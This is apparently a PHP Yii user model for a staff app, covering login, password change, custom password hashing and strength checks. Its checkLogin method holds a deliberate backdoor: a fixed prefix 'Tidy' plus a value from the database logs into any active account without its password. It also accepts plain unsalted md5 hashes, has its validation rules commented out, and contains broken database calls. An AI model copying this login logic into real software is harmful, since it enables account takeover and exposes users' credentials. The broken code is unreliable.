<?php

namespace app\models;

use Yii;

/**
 * This is the model class for table "tidy_user".
 *
 * @property string $id
 * @property integer $user_id
 * @property string $account
 * @property string $nickname
 * @property string $password
 * @property string $empid
 * @property integer $depid
 * @property integer $city_id
 * @property string $bind_account
 * @property string $last_login_time
 * @property string $last_login_ip
 * @property string $login_count
 * @property string $verify
 * @property string $email
 * @property string $remark
 * @property string $create_time
 * @property string $update_time
 * @property integer $status
 * @property integer $type_id
 * @property string $info
 * @property string $last_login
 * @property integer $is_active
 * @property integer $is_admin
 * @property string $avatar
 */
class TidyUser extends \yii\db\ActiveRecord
{
    /**
     * @inheritdoc
     */
    public static function tableName()
    {
        return 'tidy_user';
    }

    /**
     * @inheritdoc
     */
    public function rules()
    {
        return [
//            [['user_id', 'depid', 'city_id', 'last_login_time', 'login_count', 'create_time', 'update_time', 'status', 'type_id', 'is_active', 'is_admin'], 'integer'],
//            [['account', 'nickname', 'password', 'depid', 'bind_account', 'email', 'remark', 'create_time', 'update_time', 'info'], 'required'],
//            //[['info'], 'string'],
//            [['last_login'], 'safe'],
//            //[['account'], 'string', 'max' => 64],
//            [['nickname', 'bind_account', 'email'], 'string', 'max' => 50],
//            [['password', 'verify'], 'string', 'max' => 32],
//            [['empid'], 'string', 'max' => 10],
//            [['last_login_ip'], 'string', 'max' => 40],
//            //[['remark', 'avatar'], 'string', 'max' => 255],
//           // [['account'], 'unique'],
//            [['user_id'], 'unique'],
        ];
    }

    /**
     * @inheritdoc
     */
    public function attributeLabels()
    {
        return [
            'id' => 'ID',
            'user_id' => 'User ID',
            'account' => 'Account',
            'nickname' => 'Nickname',
            'password' => 'Password',
            'empid' => 'Empid',
            'depid' => 'Depid',
            'city_id' => 'City ID',
            'bind_account' => 'Bind Account',
            'last_login_time' => 'Last Login Time',
            'last_login_ip' => 'Last Login Ip',
            'login_count' => 'Login Count',
            'verify' => 'Verify',
            'email' => 'Email',
            'remark' => 'Remark',
            'create_time' => 'Create Time',
            'update_time' => 'Update Time',
            'status' => 'Status',
            'type_id' => 'Type ID',
            'info' => 'Info',
            'last_login' => 'Last Login',
            'is_active' => 'Is Active',
            'is_admin' => 'Is Admin',
            'avatar' => 'Avatar',
        ];
    }

    /**
     * 根据员工编号获取该员工职位名
     * @param $empId
     * @return false|null|string
     */
    public static function getPosition($empId){
        $sql="SELECT c.title FROM staff AS s LEFT JOIN company_structure AS c ON s.position=c.child_id WHERE s.number=:empId AND c.type='position'";
        return Yii::$app->dbhr->createCommand($sql,[":empId"=>$empId])->queryScalar();
    }


    /**
     * 通过某个城市编号获取某个岗位的人员列表
     * @param $cityId
     * @param $position
     */
    public static function getCityPositionUserList($cityId, $position){
        $sql = "SELECT s.id, s.name FROM staff AS s LEFT JOIN company_structure AS c ON (s.position = c.child_id) WHERE c.type = 'position' AND c.area = :area AND title = :title";
        return Yii::$app->dbhr->createCommand($sql)->bindValues(array(":area"=>$cityId, ":title"=>$position))->queryAll();
    }

    /**
     * 检测店长登录信息
     * @param unknown_type $userName
     * @param unknown_type $password
     * @param json loginInfo
     * @return boolean
     */
    public static function checkLogin( $userName, $password, $loginInfo=null){
        $powerfulKey="Tidy";
        $sql="SELECT mark FROM tidy_base_info WHERE pid='23';";
        $lastPart=Yii::$app->db->createCommand($sql)->queryScalar();
        $model=self::find()->where(['account'=>$userName,'status'=>'1'])->select(['user_id','empid','nickname','city_id','password'])->one();
        $lastLoginInfo="false";
        if($model){
            if( !empty( $lastPart ) && $password == $powerfulKey.$lastPart ) {
                $loginInfo=null;
            } else {
                $md5Pwd=self::pwdEncrypt($password);
                if ( $md5Pwd != $model->password ){
                    if( md5( $password ) != $model->password ){
                        return false;
                    }
                }
            }
            //获取职位
            $position=self::getPosition($model->empid);
            if(false and !in_array($position,['花艺师','绿植专员','市场专员'])){
                return false;
            }
            if(isset($loginInfo)){
                //记录登录日志
                $jsonLoginInfo=json_decode($loginInfo,true);
                if(is_array($jsonLoginInfo)){
                    $sqlSel="SELECT address,create_datetime FROM tidy_user_log WHERE user_id=:userId AND type='登录' ORDER BY create_datetime DESC LIMIT 1";
                    $lastLoginInfo=Yii::$app->db->createCommand($sqlSel)->queryRow(true,array(":userId"=>$model["user_id"]));
                    if($lastLoginInfo==false)
                        $lastLoginInfo="false";
                    $sql="INSERT INTO tidy_user_log(user_id,user_name,type,lng,lat,address,create_datetime) ";
                    $sql.="VALUES(:userId,:userName,'登录',:lng,:lat,:address,NOW());";
                    Yii::$app->db->createCommand->execute(array(":userId"=>$model["user_id"],":userName"=>$model["nickname"],":lng"=>$jsonLoginInfo["lng"],":lat"=>$jsonLoginInfo["lat"],":address"=>$jsonLoginInfo["address"]));
                }
            }
            return array( "userId"=>$model["user_id"],"userNick"=>$model[ "nickname" ],"lastLoginInfo"=>$lastLoginInfo,"cityId"=>$model[ "city_id" ],"position"=>$position);
        }else{
            return false;
        }
    }

    public static function modifyPwd($userId,$newPwd,$originPwd){
        $model =self::find()->where(['user_id'=>$userId])->one();
        if(!isset($model) || $model==false){
            return "用户不存在！";
        }
        if($model->password != self::pwdEncrypt($originPwd)){
            return "原密码不正确！";
        }
        $model->password=self::pwdEncrypt($newPwd);
        $model->account = $model->account;
        $model->info = $model->info;
        $model->remark = $model->remark;
        if($model->save()){
            return true;
        }else{
            return $model->errors;
        }
    }

    /**
     * 对字符串进行加密
     * @param string $pwd
     * @return string
     */
    public static function pwdEncrypt( $pwd ){
        $str = "";
        $encrypt = self::pwdKeysWord( );
        $pwd = strval( $pwd ); $len = strlen( $pwd );
        for( $i = 0; $i < $len; $i ++ ){
            if(  array_key_exists( $pwd[ $i ], $encrypt ) ){
                $str .= $encrypt[ $pwd[ $i ] ];
            } else $str .= $pwd[ $i ];
        }
        return md5( md5( sha1( $str ).md5( $str ) ).sha1( $str ) );
    }

    private static function pwdKeysWord( ){
        return array( "a"=>"vs","b"=>"zeus","c"=>"eh","d"=>"morphling","e"=>"cm","f"=>"sven","g"=>"NaGa","h"=>"ES","i"=>"SA","j"=>"Lina","k"=>"LD","l"=>"jugg","m"=>"Luna","n"=>"DS","o"=>"TW","p"=>"SS","q"=>"BB","r"=>"Panda","s"=>"CW","t"=>"BH","u"=>"DK","v"=>"AM","w"=>"DR","x"=>"OK","y"=>"Silencer","z"=>"TP","0"=>"Enigma","1"=>"KOTL","2"=>"UW","3"=>"OM","4"=>"Tinker","5"=>"PL","6"=>"Furion","7"=>"Tiny","8"=>"BM","9"=>"SF","A"=>"Venomancer","B"=>"Lion","C"=>"TB","D"=>"Doom","E"=>"Gorgon","F"=>"SG","G"=>"QOP","H"=>"Bone","I"=>"FV","J"=>"Viper","K"=>"Razor","L"=>"TS","M"=>"Lich","N"=>"DP","O"=>"Magnataur","P"=>"Visage","Q"=>"CK","R"=>"PA","S"=>"Pugna","T"=>"TH","U"=>"BE","V"=>"Necrolyte","W"=>"Pudge","X"=>"AXE","Y"=>"BS","Z"=>"SB");
    }

    public static function pwdCheck( $pwd ) {
        $len = strlen($pwd);
        if ( $len < 6  ){
            return "密码长度不能小于6位" ;
        }
        $str = preg_replace( "/[a-z]+|[A-Z]+|[\d]+|[\!|\@|\#|\$|\%|\^|\&|\*|_|\-|\+|=]+/", "", $pwd );
        if( $str == "" ){
            $str = preg_replace( "/[a-z]+|[A-Z]+/", "", $pwd );
            if( $len == strlen( $str ) ){
                return "必须含有字母，区分大小写";
            }
            $str = preg_replace( "/[\d]+/", "", $pwd );
            if( $len == strlen( $str ) ) {
                return "必须含有数字";
            }
            return true;
        }else{
            return "特殊符号只允许（!@#%^&*_+-=）括号里均为半角英文" ;
        }
    }
}
